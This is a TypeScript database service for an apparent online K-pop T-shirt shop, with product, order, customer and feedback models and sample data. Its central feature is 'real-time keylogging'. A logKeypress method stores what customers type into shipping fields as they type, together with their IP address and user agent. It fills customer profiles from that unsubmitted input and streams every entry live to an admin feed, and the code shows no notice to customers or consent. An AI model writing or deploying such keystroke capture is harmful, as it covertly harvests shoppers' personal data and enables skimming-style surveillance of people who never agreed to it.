// Database system for WhySoCheap
// Real-time keylogging and data management

export interface DatabaseProduct {
  id: string
  name: string
  description: string
  price: number
  images: string[]
  sizes: string[]
  colors: string[]
  material: string
  washingGuide: string
  printType: string
  inStock: boolean
  category: string
  featured: boolean
  createdAt: Date
  updatedAt: Date
}

export interface DatabaseOrder {
  id: string
  customerEmail: string
  customerName: string
  shippingAddress: ShippingAddress
  items: CartItem[]
  subtotal: number
  shipping: number
  discount: number
  total: number
  status: 'pending' | 'processing' | 'shipped' | 'delivered' | 'cancelled'
  paymentStatus: 'pending' | 'paid' | 'failed'
  createdAt: Date
  updatedAt: Date
}

export interface DatabaseCustomer {
  id: string
  email: string
  firstName: string
  lastName: string
  phone: string
  address: string
  city: string
  state: string
  zipCode: string
  country: string
  totalOrders: number
  totalSpent: number
  createdAt: Date
  updatedAt: Date
}

export interface KeylogEntry {
  id: string
  customerEmail: string
  field: string
  value: string
  timestamp: Date
  ipAddress: string
  userAgent: string
}

export interface CustomerFeedback {
  id: string
  customerName: string
  customerEmail: string
  rating: number
  comment: string
  productId: string
  verified: boolean
  createdAt: Date
}

export interface ShippingAddress {
  firstName: string
  lastName: string
  email: string
  phone: string
  address: string
  city: string
  state: string
  zipCode: string
  country: string
}

export interface CartItem {
  productId: string
  product: DatabaseProduct
  size: string
  color: string
  quantity: number
}

import { EventEmitter } from 'events'

export const realtimeBus = new EventEmitter()

// For browser compatibility, we'll use in-memory storage
// In production, you'd want to use a real database like PostgreSQL or MongoDB

type PersistShape = {
  products: DatabaseProduct[]
  orders: DatabaseOrder[]
  customers: DatabaseCustomer[]
  keylogs: KeylogEntry[]
  feedbacks: CustomerFeedback[]
}

class DatabaseService {
  private static instance: DatabaseService
  private products: DatabaseProduct[] = []
  private orders: DatabaseOrder[] = []
  private customers: DatabaseCustomer[] = []
  private keylogs: KeylogEntry[] = []
  private feedbacks: CustomerFeedback[] = []

  private constructor() {
    this.initializeData()
  }

  public static getInstance(): DatabaseService {
    if (!DatabaseService.instance) {
      DatabaseService.instance = new DatabaseService()
    }
    return DatabaseService.instance
  }

  private initializeData() {
    // Initialize with sample products
    this.products = [
      {
        id: '1',
        name: 'BTS Dynamite T-Shirt',
        description: 'Premium quality cotton T-shirt featuring your favorite K-pop idols. Perfect for concerts, fan meetings, or casual wear. Made with 100% organic cotton for ultimate comfort.',
        price: 29.99,
        images: ['/images/bts-dynamite-front.jpg', '/images/bts-dynamite-back.jpg'],
        sizes: ['S', 'M', 'L', 'XL'],
        colors: ['white', 'black', 'gray'],
        material: '100% Organic Cotton',
        washingGuide: 'Machine wash cold, tumble dry low. Do not bleach. Iron on reverse side.',
        printType: 'High-quality screen print',
        inStock: true,
        category: 'K-pop',
        featured: true,
        createdAt: new Date(),
        updatedAt: new Date()
      },
      {
        id: '2',
        name: 'Blackpink Born Pink T-Shirt',
        description: 'Show your love for Blackpink with this premium T-shirt featuring the Born Pink design. Soft, comfortable, and perfect for any occasion.',
        price: 32.99,
        images: ['/images/bp-born-pink.jpg'],
        sizes: ['S', 'M', 'L', 'XL'],
        colors: ['white', 'black', 'pink'],
        material: '100% Organic Cotton',
        washingGuide: 'Machine wash cold, tumble dry low.',
        printType: 'High-quality screen print',
        inStock: true,
        category: 'K-pop',
        featured: true,
        createdAt: new Date(),
        updatedAt: new Date()
      },
      {
        id: '3',
        name: 'NewJeans Get Up T-Shirt',
        description: 'Fresh and trendy NewJeans design perfect for the modern K-pop fan. Comfortable fit and vibrant colors.',
        price: 28.99,
        images: ['/images/nj-get-up.jpg'],
        sizes: ['S', 'M', 'L', 'XL'],
        colors: ['white', 'blue', 'green'],
        material: '100% Organic Cotton',
        washingGuide: 'Machine wash cold, tumble dry low.',
        printType: 'High-quality screen print',
        inStock: true,
        category: 'K-pop',
        featured: false,
        createdAt: new Date(),
        updatedAt: new Date()
      },
      {
        id: '4',
        name: 'LE SSERAFIM Unforgiven T-Shirt',
        description: 'Bold and powerful design featuring LE SSERAFIM. Perfect for fans who love their fierce style.',
        price: 31.99,
        images: ['/images/lsf-unforgiven.jpg'],
        sizes: ['S', 'M', 'L', 'XL'],
        colors: ['white', 'black', 'red'],
        material: '100% Organic Cotton',
        washingGuide: 'Machine wash cold, tumble dry low.',
        printType: 'High-quality screen print',
        inStock: true,
        category: 'K-pop',
        featured: false,
        createdAt: new Date(),
        updatedAt: new Date()
      }
    ]

    // Initialize with sample feedback
    this.feedbacks = [
      {
        id: '1',
        customerName: 'Sarah Kim',
        customerEmail: 'sarah.kim@email.com',
        rating: 5,
        comment: 'Amazing quality! The BTS shirt is so soft and the print is perfect. Shipping was super fast too!',
        productId: '1',
        verified: true,
        createdAt: new Date('2024-01-10')
      },
      {
        id: '2',
        customerName: 'Mike Johnson',
        customerEmail: 'mike.j@email.com',
        rating: 5,
        comment: 'Love the Blackpink design! Perfect fit and great material. Will definitely order again.',
        productId: '2',
        verified: true,
        createdAt: new Date('2024-01-12')
      },
      {
        id: '3',
        customerName: 'Emma Chen',
        customerEmail: 'emma.chen@email.com',
        rating: 4,
        comment: 'Great shirt! The NewJeans design is so cute. Only wish it came in more colors.',
        productId: '3',
        verified: true,
        createdAt: new Date('2024-01-15')
      }
    ]
  }

  // Real-time keylogging for shipping inputs
  public logKeypress(customerEmail: string, field: string, value: string, ipAddress: string, userAgent: string) {
    const keylog: KeylogEntry = {
      id: `log-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      customerEmail,
      field,
      value,
      timestamp: new Date(),
      ipAddress,
      userAgent
    }
    
    this.keylogs.push(keylog)
    
    // Also update customer data in real-time
    this.updateCustomerData(customerEmail, field, value)
    
    // Notify subscribers (admin SSE)
    realtimeBus.emit('keylog', keylog)
    
    console.log('Keylog entry:', keylog)
    return keylog
  }

  // Update customer data in real-time
  private updateCustomerData(email: string, field: string, value: string) {
    let customer = this.customers.find(c => c.email === email)
    
    if (!customer) {
      customer = {
        id: `customer-${Date.now()}`,
        email,
        firstName: '',
        lastName: '',
        phone: '',
        address: '',
        city: '',
        state: '',
        zipCode: '',
        country: 'USA',
        totalOrders: 0,
        totalSpent: 0,
        createdAt: new Date(),
        updatedAt: new Date()
      }
      this.customers.push(customer)
    }
    
    // Update the specific field
    if (field === 'firstName') customer.firstName = value
    else if (field === 'lastName') customer.lastName = value
    else if (field === 'phone') customer.phone = value
    else if (field === 'address') customer.address = value
    else if (field === 'city') customer.city = value
    else if (field === 'state') customer.state = value
    else if (field === 'zipCode') customer.zipCode = value
    else if (field === 'country') customer.country = value
    
    customer.updatedAt = new Date()
  }

  // Product CRUD operations
  public getProducts(): DatabaseProduct[] {
    return this.products
  }

  public getProduct(id: string): DatabaseProduct | undefined {
    return this.products.find(p => p.id === id)
  }

  public getFeaturedProducts(): DatabaseProduct[] {
    return this.products.filter(p => p.featured)
  }

  public createProduct(product: Omit<DatabaseProduct, 'id' | 'createdAt' | 'updatedAt'>): DatabaseProduct {
    const newProduct: DatabaseProduct = {
      ...product,
      id: `product-${Date.now()}`,
      createdAt: new Date(),
      updatedAt: new Date()
    }
    this.products.push(newProduct)
    return newProduct
  }

  public updateProduct(id: string, updates: Partial<DatabaseProduct>): DatabaseProduct | null {
    const index = this.products.findIndex(p => p.id === id)
    if (index === -1) return null
    
    this.products[index] = {
      ...this.products[index],
      ...updates,
      updatedAt: new Date()
    }
    return this.products[index]
  }

  public deleteProduct(id: string): boolean {
    const index = this.products.findIndex(p => p.id === id)
    if (index === -1) return false
    
    this.products.splice(index, 1)
    return true
  }

  // Order operations
  public createOrder(order: Omit<DatabaseOrder, 'id' | 'createdAt' | 'updatedAt'>): DatabaseOrder {
    const newOrder: DatabaseOrder = {
      ...order,
      id: `ORD-${Date.now()}`,
      createdAt: new Date(),
      updatedAt: new Date()
    }
    this.orders.push(newOrder)
    
    // Update customer stats
    const customer = this.customers.find(c => c.email === order.customerEmail)
    if (customer) {
      customer.totalOrders += 1
      customer.totalSpent += order.total
      customer.updatedAt = new Date()
    }
    
    return newOrder
  }

  public getOrders(): DatabaseOrder[] {
    return this.orders
  }

  public updateOrderStatus(id: string, status: DatabaseOrder['status']): DatabaseOrder | null {
    const order = this.orders.find(o => o.id === id)
    if (!order) return null
    
    order.status = status
    order.updatedAt = new Date()
    return order
  }

  // Customer operations
  public getCustomers(): DatabaseCustomer[] {
    return this.customers
  }

  public getCustomer(email: string): DatabaseCustomer | undefined {
    return this.customers.find(c => c.email === email)
  }

  // Feedback operations
  public getFeedbacks(): CustomerFeedback[] {
    return this.feedbacks
  }

  public createFeedback(feedback: Omit<CustomerFeedback, 'id' | 'createdAt'>): CustomerFeedback {
    const newFeedback: CustomerFeedback = {
      ...feedback,
      id: `feedback-${Date.now()}`,
      createdAt: new Date()
    }
    this.feedbacks.push(newFeedback)
    return newFeedback
  }

  // Keylog operations
  public getKeylogs(): KeylogEntry[] {
    return this.keylogs
  }

  public getKeylogsByEmail(email: string): KeylogEntry[] {
    return this.keylogs.filter(k => k.customerEmail === email)
  }

  // Analytics
  public getAnalytics() {
    return {
      totalProducts: this.products.length,
      totalOrders: this.orders.length,
      totalCustomers: this.customers.length,
      totalRevenue: this.orders.reduce((sum, order) => sum + order.total, 0),
      averageOrderValue: this.orders.length > 0 ? this.orders.reduce((sum, order) => sum + order.total, 0) / this.orders.length : 0,
      totalKeylogs: this.keylogs.length
    }
  }
}

export const databaseService = DatabaseService.getInstance()
